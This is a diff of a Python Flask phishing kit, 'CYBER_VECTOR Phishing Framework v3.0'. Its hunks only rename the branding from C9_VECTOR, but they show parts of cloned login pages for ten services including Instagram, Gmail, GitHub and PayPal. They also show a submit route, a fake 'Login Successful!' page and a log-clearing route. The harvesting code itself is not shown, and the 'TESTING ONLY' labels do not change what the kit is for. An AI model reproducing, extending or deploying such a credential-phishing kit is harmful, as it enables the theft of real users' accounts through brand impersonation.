@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-C9_VECTOR Phishing Framework v3.0 - Complete Website
+CYBER_VECTOR Phishing Framework v3.0 - Complete Website
 10 Templates: Instagram, Facebook, Twitter, Discord, Snapchat, TikTok, Gmail, GitHub, Netflix, PayPal
-Author: C9_VECTOR
+Author: CYBER_VECTOR
 """
 
 from flask import Flask, request, render_template_string, jsonify, redirect
@@ -105,7 +105,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo">Instagram</div>
@@ -120,7 +120,7 @@ TEMPLATES = {
         </div>
         <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
         <div class="app-links"><p>Get the app.</p><div class="app-buttons"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Google Play"></div></div>
-        <div class="footer"><span>⚠️</span> Security Test by <strong>C9_VECTOR</strong> <span>⚠️</span></div>
+        <div class="footer"><span>⚠️</span> Security Test by <strong>CYBER_VECTOR</strong> <span>⚠️</span></div>
     </div>
 </body>
 </html>
@@ -162,7 +162,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo">facebook</div>
@@ -216,7 +216,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo">𝕏</div>
@@ -270,7 +270,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo"><svg viewBox="0 0 127.14 96.36" fill="#5865f2"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.42,68.42,0,0,1-10.85,5.18,77.7,77.7,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.87,46,53.87,53,48.69,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5-12.74,11.43-12.74S96.12,46,96.12,53,90.94,65.69,84.69,65.69Z"/></svg></div>
@@ -318,7 +318,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo">👻</div>
@@ -364,7 +364,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo">🎵</div>
@@ -412,7 +412,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo">Gmail</div>
@@ -458,7 +458,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="logo">🐙</div>
         <div class="box">
@@ -503,7 +503,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo">NETFLIX</div>
@@ -547,7 +547,7 @@ TEMPLATES = {
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="login-box">
             <div class="logo">Pay<span>Pal</span></div>
@@ -586,7 +586,7 @@ def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C9_VECTOR Phishing Framework</title>
+    <title>CYBER_VECTOR Phishing Framework</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0a; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
@@ -606,10 +606,10 @@ def index():
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="header">
-            <h1>⚠️ C9_VECTOR</h1>
+            <h1>⚠️ CYBER_VECTOR</h1>
             <p>Phishing Framework - <span style="color:#ff0000;">TESTING ONLY</span></p>
         </div>
         <div class="grid">
@@ -680,7 +680,7 @@ def submit():
     </style>
 </head>
 <body>
-    <div class="c9-vector">C9_VECTOR</div>
+    <div class="c9-vector">CYBER_VECTOR</div>
     <div class="container">
         <div class="icon">✅</div>
         <div class="title">Login Successful!</div>
@@ -712,7 +712,7 @@ def clear_logs():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════╗
-    ║  C9_VECTOR Phishing Framework v3.0       ║
+    ║  CYBER_VECTOR Phishing Framework v3.0       ║
     ║  10 Templates Loaded                     ║
     ║  http://localhost:5000                   ║
     ╚═══════════════════════════════════════════╝
